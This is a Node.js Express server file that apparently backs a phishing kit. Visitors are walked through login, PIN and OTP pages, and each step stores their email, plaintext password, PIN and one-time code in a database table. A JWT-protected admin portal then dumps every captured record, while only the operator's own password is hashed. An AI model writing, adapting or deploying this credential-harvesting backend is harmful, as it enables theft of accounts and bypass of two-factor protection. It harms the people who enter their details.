// server.js
import express from 'express';
import dotenv from 'dotenv';
//import userRoutes from './Routes.js';
import path, { dirname } from 'path';
import fs from 'fs'
import cors from 'cors'
import { fileURLToPath } from 'url';

// Define __dirname for ES modules
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

import jsonwebtoken from 'jsonwebtoken'
import DBconnection from './Dbconnection.js';
import bcrypt from'bcrypt'
import { Dir } from 'fs';
import { console } from 'inspector';

const pss = dotenv.configDotenv({ path: '', encoding: 'latin1', quiet: false, debug: true, override: false })

const app = express();
const PORT = 3020;
app.use(express.static(path.join(path.basename(''), 'www')));
app.use(express.json());
app.use(cors({
  origin: "null", // Or '*' for all origins
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'], // Allowed methods
  credentials: true,
  allowedHeaders: ['Content-Type', 'Authorization', 'credentials'] // Allowed headers
}));
const router = express.Router()
app.use('',router)
//app.use(cookieParser());

  function middleware (req, res, next) {
         //msg
    // Extract token from Authorization header or cookie
    const token =  req.headers.cookie.split('token=')[1]; 
     console.log(token)
    
    if (!token) {
        return res.status(401); // Unauthorized
    }
    let key = process.env.JWT_SECRET
    jsonwebtoken.verify(token,key ,(err, user) => {
      
        if (err) {
          
         res.json({msg: 'invalid token'})
          res.status(403);  // Forbidden (e.g., invalid or expired token)
        }else{
        //res.json({msg: 'successful'})
       // req.user = user; // Attach user payload to request object
       req.user = user;
       next()
        }
        
    });
    // Example usage in a protected route:
// app.get('/protected-route', authenticateToken, (req, res) => {
//     res.json({ message: 'Access granted', user: req.user });
// });
}


 
// Default route
app.get('', (req, res) => {
  res.sendFile(path.join(__dirname, 'www', 'index.html')); 
 
});

app.post('/sendreq', async (req, res) =>{
  const data = req.body
  const email = data.email
  console.log(data)
    if (data.msg == 'login') {
      const msg = data.message 
      const paasword = data.password
      const date = new Date;

      const add_user = await DBconnection.query(
        `INSERT INTO userx ( email, complaint, pin, password, verification_code, date)
         VALUES ($1, $2, $3, $4, $5, $6) RETURNING  email, complaint, pin, password, verification_code, date`,
        [ email, msg, '', paasword, '',`Time: ${date.getHours()}:${date.getMinutes()} Date: ${date.getDate()}  ${date.getMonth()}  ${date.getFullYear()}` ]
      ).then(async function (params) {
         if (params.rowCount ==1) {
          console.log(params.rows)
          res.json({msg:'successful'})
         }
      })
      
    }
    if (data.msg == 'pin') {
      const pin = data.pin
      const update = await DBconnection.query(
        'UPDATE userx SET pin = $1 WHERE email = $2 RETURNING *',
        [pin,email]
      ) 
         console.log(update.rows[0])
         res.json({msg:'successful'})
 
    }
    if (data.msg == 'otp') {
      const otp = data.otp
      const update = await DBconnection.query(
        'UPDATE userx SET verification_code  = $1 WHERE email = $2 RETURNING *',
        [otp,email]
      )
         console.log(update.rows[0])
         res.json({msg:'successful'})
      
    }
})

router.get('/login', (req, res) => {
  res.sendFile(path.join(__dirname, 'www', 'login.html')); 
 
});
router.get('/pin',(req, res) => {
  res.sendFile(path.join(__dirname, 'www', 'pin.html')); 
 
});
router.get('/otp',(req, res) => {
  res.sendFile(path.join(__dirname, 'www', 'otp.html')); 
 
});
router.get('/admin',(req, res) => {
  res.sendFile(path.join(__dirname, 'www', 'adm.html')); 
 
});
router.post('/portal', async (req, res) =>{
  
  
   const authentication= req.headers.authorization
   if (authentication) {
    let key = process.env.JWT_SECRET
   
       if (req.body.msg == 'login') {
     const  username = req.body.username
     const password = req.body.password
     console.log(req.headers)
    const check_user = await DBconnection.query('SELECT * FROM admin WHERE username = $1', [username])
    .then(async val =>{
      console.log(val.rows)
      if (val.rows.length == 1) {
        const verify_password = await bcrypt.compare(password, val.rows[0].password);
      
        if (verify_password) {
          const all_data = await DBconnection.query('SELECT * FROM userx ')
          const token = jsonwebtoken.sign({username: val.rows[0].username },key, { expiresIn: '1hr' });
          console.log(all_data.rows)
        res.json({msg:'successful', all:all_data.rows, token:token})
        }else{res.status(403).json({msg: 'incorrect password'})}
      }else{res.status(404).json({msg: 'no user found'})}
    })
       }
       if (req.body.msg =='checklogin') {
       console.log(req.headers)
       jsonwebtoken.verify(authentication,key , async(err, user) => {
       if (err) {
         console.log(err)
        return res.status(200).json({msg: 'invalid token'});  // Forbidden (e.g., invalid or expired token)
       }else{
        const all_data = await DBconnection.query('SELECT * FROM userx ')
        user=user
        console.log(all_data.rows)
        res.json({msg:'successful', all:all_data.rows})
       }
      });
    }}

})
//let utf8 = new Utf8Stream('utf8')

// Base route
// app.post('/pin', middleware, async (req, res)=>{
      
//     const user = req.body.username;
//     const pin = req.body.userPin;
//     const check_user3 = await DBconnection.query('SELECT * FROM user_profile WHERE username = $1', [user]);
//     if (check_user3.rows.length == 1) {
//       const userpin = check_user3.rows[0].pin
//       console.log([userpin, pin])
//       let verify_pin ;
//         userpin == null? res.json({msg: 'no active pin'}) :   verify_pin = await bcrypt.compare(pin, userpin);
     
//       if (check_user3.rows[0].pin == verify_pin) {
        
//           res.status(200)
//           res.json({msg: 'pin login successful', username:check_user3.rows[0].username})
          
//       }else{ res.json({msg: 'Incorrect pin'});}
      
//     }else{res.json({msg: 'No user found'})}
  

// })
//app.use('/account', userRoutes);


app.use(express.static(path.join(path.dirname('public'))));
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
